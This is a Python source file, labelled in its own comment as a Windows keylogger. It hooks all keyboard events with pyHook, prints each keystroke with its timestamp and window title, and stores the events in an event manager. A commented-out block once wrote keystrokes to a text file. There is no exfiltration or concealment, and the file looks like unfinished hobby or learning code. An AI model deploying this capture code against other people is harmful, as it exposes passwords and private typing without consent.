# Python code for keylogger 
# to be used in windows 
import win32console 
import pythoncom, pyHook 
import os, sys
from EventManager import EventManager, KeyEvent
from datetime import datetime
win = win32console.GetConsoleWindow()

eventManager = EventManager()

def OnKeyboardEvent(event): 
    print(datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
    print ('MessageName:',event.MessageName)
    # print ('Message:',event.Message)
    # print ('Time:',event.Time)
    # print ('Window:',event.Window)
    print ('WindowName:',event.WindowName)
    print ('Ascii:', event.Ascii, chr(event.Ascii))
    # print ('Key:', event.Key)
    # print ('KeyID:', event.KeyID)
    # print ('ScanCode:', event.ScanCode)
    # print(datetime.datetime(1970, 1, 1) + datetime.timedelta(seconds=(-event.Time)))

    # print ('Extended:', event.Extended)
    # print ('Injected:', event.Injected)
    # print ('Alt', event.Alt)
    # print ('Transition', event.Transition)
    # print(event.flags)
    
    if event.Ascii==5 or chr(event.Ascii) == ']': 
        sys.exit(1)
    now = datetime.now()
    now_datetime = now.strftime("%d/%m/%Y %H:%M:%S")
    now_epoch = now.timestamp()
    isCaps = True
    event = KeyEvent(now_datetime, now_epoch, event.MessageName, event.WindowName, event.Ascii, chr(event.Ascii), isCaps, processKey(chr(event.Ascii), isCaps))
    print(event)
    print ('---')
    eventManager.addEvent(event)
    # if event.Ascii !=0 or 8:
    
    # #open output.txt to read current keystrokes 
    #     f = open(os.getcwd()+'\output.txt', 'r+') 
    #     buffer = f.read()
    #     f.truncate()
    #     f.close() 
    # # open output.txt to write current + new keystrokes 
    #     f = open(os.getcwd()+'\output.txt', 'w') 
    #     keylogs = chr(event.Ascii) 
    #     if event.Ascii == 13: 
    #         kkkeylogs = '/n'
    #     buffer += keylogs 
    #     f.write(buffer) 
    #     f.close()
    
    # eventManager.addEvent(event.Ascii, chr(event.Ascii), )
    
    
    return True


def processKey(lowerKey, isCaps):
    if not isCaps:
        return lowerKey
    return lowerKey.upper()

try:
	# create a hook manager object 
	hm = pyHook.HookManager() 
	hm.KeyAll = OnKeyboardEvent
	# set the hook 
	hm.HookKeyboard() 
	# wait forever 
	pythoncom.PumpMessages()
except KeyboardInterrupt:
    sys.exit(1)
except Exception as e:
	print("Exception: ",e)
	sys.exit(1)
	# hm.UnhookKeyboard()
	
'''
On startup, check if capslock and shift are being pressed down - this will determine self.caps = True/False

Then, have listeners for keyup and keydown (key pressed down, and key coming back up)

On key down:
* if caps lock, toggle self.caps
* if shift, toggle self.caps

On key up:
* if caps, toggle self.caps
* if shift, toggle self.caps

This will work when shift/caps are held down, as they don't toggle unless pressed again


'''